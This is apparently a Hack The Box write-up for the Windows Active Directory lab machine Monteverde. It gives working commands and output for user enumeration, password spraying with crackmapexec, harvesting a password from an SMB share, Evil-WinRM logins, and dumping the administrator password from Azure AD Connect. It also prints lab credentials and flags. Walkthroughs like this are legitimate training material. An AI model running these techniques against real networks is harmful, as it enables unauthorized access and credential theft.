---
layout: single
title: Monteverde - Hack The Box
excerpt: "Monteverde is and medium difficult Windows machine, It's Active Direcoty box. Initial foothold involves guessing the weak passwords for the users. Later, password for `mhope` user is discloded through `azure.xml` file which left unattended in `users$/mhope` share. We find that `mhope` user is member of `azure admins` group. we Abuse `Azure AD Connect Service` to extract the credentials of `Administrator`."
date: 2020-06-13
classes: wide
header:
  teaser: /assets/images/htb-writeup-monteverde/monteverde_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - Azure
  - Active Directory
  - AD Connect
  - ADSync
---

![](/assets/images/htb-writeup-monteverde/monteverde_logo.png)

## Synopsis
Monteverde is and medium difficult Windows machine, It's Active Direcoty box. Initial foothold involves guessing the weak passwords for the users. Later, password for `mhope` user is discloded through `azure.xml` file which left unattended in `users$/mhope` share. We find that `mhope` user is member of `azure admins` group. we Abuse `Azure AD Connect Service` to extract the credentials of `Administrator`.
## Skills Required
* Enumeration
* Active Directory
  
## Skills Learned
* Azure services
* ADSync
* Abusing AD Connect Service
 
---
## Enumeration
### Nmap
```java
# Nmap 7.60 scan initiated Sun Jan 12 12:22:16 2020 as: nmap -sC -sV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49669,49670,49671,49702,49779 -o full.nmap mounteverde.htb
Nmap scan report for mounteverde.htb (10.10.10.172)
Host is up (0.23s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-01-12 07:01:49Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49779/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-01-12 12:32:45
|_  start_date: 1601-01-01 05:53:28
```
`DNS` running on its default port and next thing we see is `kerberos` listening on port `88`. Soon i see `kerberos` i look for `ldap` . Upon seeing `DNS, kerberos, ldap` i assume i'm on a windows Active Directory box.

we can see `ldap` is giving up its domain name `MEGABANK.LOCAL0`.

### SMB Enumeration
Let's see if we can list the user's of `RPC Client`.
```
rpcclient -U "" 10.10.10.172

rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```
we found the potential users on the machine. With the help of this we make `users.txt` which looks like this:
```
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```
### Initial Foothold
Now, we've to find the credentials for the users or brute force their login on `smb`. We'll use `crackmapexec` to burte force user password. we'll supply same user.txt list to password field.

```
 crackmapexec smb 10.10.10.172 -u users.txt -p users.txt

SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False)
<SNIP>
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:svc-bexec STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:svc-netapp STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:dgalanos STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:roleary STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:smorgan STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\SABatchJobs:Guest STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\SABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\SABatchJobs:mhope STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\SABatchJobs:SABatchJobs
```
We obtained credentials of `MEGABANK\SABatchJobs:SABatchJobs`. It's time to look for possible shares with help of this credentials . we list shares using `smbmap` with this credentials.

```
smbmap -u SABatchJobs -p 'SABatchJobs' -H 10.10.10.172

[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.172...
[+] IP: 10.10.10.172:445        Name: monteverde.htb
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        azure_uploads                                           READ ONLY
        C$                                                      NO ACCESS
        E$                                                      NO ACCESS
        IPC$                                                    READ ONLY
        NETLOGON                                                READ ONLY
        SYSVOL                                                  READ ONLY
        users$                                                  READ ONLY
```
we've read access on `azure_uploads` and `users$` shares . let look at them and see if we can find any sensitive info which is useful for us. we'll use `smbclient` to look into each share. `azure_uploads` share is empty so we'll ignore that.

```
smbclient -U 'SABatchJobs' //10.10.10.172/users$

Enter WORKGROUP\SABatchJobs's password: 
Try "help" to get a list of possible commands.
smb: \> recurse
smb: \> ls
  .                                   D        0  Fri Jan  3 18:42:48 2020
  ..                                  D        0  Fri Jan  3 18:42:48 2020
  dgalanos                            D        0  Fri Jan  3 18:42:30 2020
  mhope                               D        0  Fri Jan  3 19:11:18 2020
  roleary                             D        0  Fri Jan  3 18:40:30 2020
  smorgan                             D        0  Fri Jan  3 18:40:24 2020

\dgalanos
  .                                   D        0  Fri Jan  3 18:42:30 2020
  ..                                  D        0  Fri Jan  3 18:42:30 2020

\mhope
  .                                   D        0  Fri Jan  3 19:11:18 2020
  ..                                  D        0  Fri Jan  3 19:11:18 2020
  azure.xml                          AR     1212  Fri Jan  3 19:10:23 2020

\roleary
  .                                   D        0  Fri Jan  3 18:40:30 2020
  ..                                  D        0  Fri Jan  3 18:40:30 2020

\smorgan
  .                                   D        0  Fri Jan  3 18:40:24 2020
  ..                                  D        0  Fri Jan  3 18:40:24 2020

                524031 blocks of size 4096. 519955 blocks available
smb: \mhope\> get azure.xml
getting file \mhope\azure.xml of size 1212 as azure.xml (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
```
```
cat azure.xml

<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```
## User
looking at content of the `azure.xml` we find a password `4n0therD4y@n0th3r$` init. which is possibley `mhope` user password. we'll try login into the box with these credentials using `Evil-WinRM`.
```
evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents> cd ../Desktop

*Evil-WinRM* PS C:\Users\mhope\Desktop> ls


    Directory: C:\Users\mhope\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         1/3/2020   5:48 AM             32 user.txt


*Evil-WinRM* PS C:\Users\mhope\Desktop> cat user.txt
4961976bd7d8f4eeb2ce3705e2f212f2
```
Now we're user `mhope` and we can read the `user.txt` file. 

## Privilege Escalation

Taking a look at look at privileges of `mhope` user we can find the user is a memeber of `Azure Admins` group.

```
*Evil-WinRM* PS C:\Users\mhope\Desktop> whoami /all                                                                                                                  
                                                                                                                                                                     
USER INFORMATION                                                                                                                                                     
----------------

User Name      SID
============== ============================================
megabank\mhope S-1-5-21-391775091-850290835-3566037492-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

```
Little googling about this role . we can find that `we can Extract credentials from the Azure AD Connect Service`

The Azure AD Connect service is essentially responsible for synchronizing things between your local AD domain, and the Azure based domain. However, to do this it needs privileged credentials for your local domain so that it can perform various operations such as syncing passwords etc. we can  decrypt credentials using `DCSync attack`.

Performing the attack is as easy as downloading a powershell script from [Azure-ADConnect.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1). More info about the attack can be found at [xpnsec blog](https://blog.xpnsec.com/azuread-connect-for-redteam/)

we'll upload `Azure-ADConnect.ps1` to the box using evil-winrm upload functionality and execute with by passing server ip and db as parameters.

```
*Evil-WinRM* PS C:\tmp> ./Azure-ADConnect.ps1
*Evil-WinRM* PS C:\tmp> Azure-ADConnect -server 127.0.0.1 -db ADSync
[+] Domain:  MEGABANK.LOCAL
[+] Username: administrator
[+]Password: d0m@in4dminyeah!
```
The credential we extracted belong to `administrator` cool. Now we can login is as Administrator on the box using `Evil-WinRm` with `administrator:d0m@in4dminyeah!`.

```
evil-winrm.rb -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
megabank\administrator
*Evil-WinRM* PS C:\Users\Administrator\Desktop> hostname
MONTEVERDE
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         1/3/2020   5:48 AM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
12909612d25c8dcf6e5a07d1a804a0bc
```

